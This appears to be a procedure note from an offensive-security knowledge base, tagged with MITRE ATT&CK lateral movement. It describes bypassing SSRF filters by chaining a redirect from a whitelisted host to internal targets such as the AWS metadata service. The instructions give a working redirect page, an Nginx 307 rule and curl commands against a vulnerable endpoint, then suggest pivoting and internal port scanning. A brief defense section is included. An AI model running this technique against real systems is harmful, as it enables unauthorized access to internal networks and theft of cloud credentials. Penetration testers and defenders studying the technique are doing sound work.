---
type: procedure
description: >-
  Bypass SSRF filters by using a redirect from a whitelisted host to access
  internal resources.
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Bypassing filters]]'
  - '[[tags/Bypassing using a redirect]]'
  - '[[tags/Server-Side Request Forgery]]'
  - ssrf
  - redirect-bypass
commands:
  - '[[commands/curl-launch-ssrf-redirect]]'
tools: []
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Server-Side-Request-Forgery-via-Redirect-Attack

## Summary

This procedure demonstrates how to exploit a Server-Side Request Forgery (SSRF) vulnerability by leveraging a redirect from a whitelisted host to bypass URL filters. The attacker hosts a redirect page on an allowed domain that points to an internal target, then tricks the vulnerable server into fetching that redirect, allowing access to restricted resources such as internal metadata services or network pivots.

## Description

Server-Side Request Forgery (SSRF) occurs when a server can be manipulated to make requests to arbitrary locations, potentially exposing internal systems. In this variant, direct requests to internal IPs or schemes are blocked by filters, but redirects from trusted (whitelisted) hosts are followed. The attacker creates a simple redirect page on a whitelisted domain (e.g., a personal server or cloud storage link) that uses HTTP status codes 307 or 308 to preserve the original request method and body during redirection. When the vulnerable application fetches the whitelisted URL, it follows the redirect to the target internal resource, relaying the response back to the attacker. This technique is effective against applications that validate URLs against a whitelist but fail to block chained redirects. It can lead to internal port scanning, metadata exfiltration (e.g., AWS instance metadata), or lateral movement within the network.

## Requirements

1. Access to the vulnerable web application endpoint that accepts URL parameters (e.g., image loaders, webhooks).
2. A whitelisted host or domain where you can host a redirect page (e.g., your own server, GitHub Pages, or a cloud bucket).
3. Knowledge of the internal target URL (e.g., http://169.254.169.254/latest/meta-data/ for AWS metadata).
4. Tools like curl or a browser for testing requests; optionally, Burp Suite for intercepting and modifying.
5. Network access to send requests to the vulnerable server.

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation that disables redirects or only allows same-origin fetches.
- Use network segmentation to isolate internal services from application servers.
- Monitor application logs for unusual outbound requests, especially to whitelisted domains followed by internal redirects.
- Deploy Web Application Firewalls (WAFs) with rules to detect chained redirects and block HTTP 3xx responses in user-controlled contexts.
- Enable logging of all server-side HTTP requests, including destination URLs and response codes.

## Objectives

1. Bypass SSRF filters by chaining a whitelisted redirect to an internal target.
2. Access restricted internal resources or services via the vulnerable server.
3. Exfiltrate data or perform reconnaissance on internal network components.
4. Maintain request method and body integrity using 307/308 status codes for POST-based attacks.

## Instructions

### Step 1: Set Up Redirect Page on Whitelisted Host

**Context**: Create a simple HTML page on a domain or host that is whitelisted by the vulnerable application. This page will redirect to the internal target URL while preserving the HTTP method and body using status code 307 or 308.

Host the following HTML on your whitelisted server (e.g., at http://your-whitelisted-host.com/redirect):

```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Location" content="http://internal-target.example.com" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Redirect</title>
</head>
<body>
    <script>
        window.location.replace("http://internal-target.example.com");
    </script>
</body>
</html>
```

For server-side redirect, configure your web server (e.g., Apache/Nginx) to return a 307 redirect:

- In Nginx: `return 307 http://internal-target.example.com$request_uri;`
- Ensure the redirect preserves POST data.

**Expected Output**: The page loads and immediately redirects to the target when fetched.

### Step 2: Launch SSRF Request to Vulnerable Endpoint

**Context**: Send a crafted request to the vulnerable application's URL parameter, pointing it to your whitelisted redirect host. The server will fetch the whitelisted URL, follow the redirect to the internal target, and return the response.

**Command** ([[commands/curl-launch-ssrf-redirect]]):
```bash
curl -X GET "http://vulnerable.com/index.php?url=http://$_WHITELISTED_HOST/redirect" -v
```

> This command sends a GET request to the vulnerable endpoint with the URL parameter set to your whitelisted redirect. Use -X POST if the original request method requires it. The -v flag provides verbose output to inspect the request/response flow. Replace $_WHITELISTED_HOST with your actual whitelisted domain/IP.

**Expected Output**: The vulnerable server fetches the redirect, follows it to the internal target, and echoes back the internal resource's content (e.g., AWS metadata JSON) in the response body.

### Step 3: Verify and Iterate with Method Preservation

**Context**: If the attack involves POST data or specific methods, test with 307/308 redirects to ensure the method and body are preserved. Monitor the response for success indicators like internal data leakage.

Use the same command but with POST:

**Command** ([[commands/curl-launch-ssrf-redirect]]):
```bash
curl -X POST "http://vulnerable.com/index.php?url=http://$_WHITELISTED_HOST/redirect" -d "payload=data" -v
```

> Adjust the redirect configuration to use 307 Temporary Redirect to maintain POST semantics. Inspect the verbose output for the chained request details.

**Expected Output**: Response contains data from the internal target, confirming the bypass. No filter blocks on the whitelisted URL.

### Step 4: Analyze Response and Pivot

**Context**: Review the relayed response for sensitive information. Use this access to chain further attacks, such as port scanning internals by varying the redirect target.

Parse the output manually or with tools like jq for JSON responses.

**Expected Output**: Extracted internal data, such as service banners or metadata, enabling further exploitation.
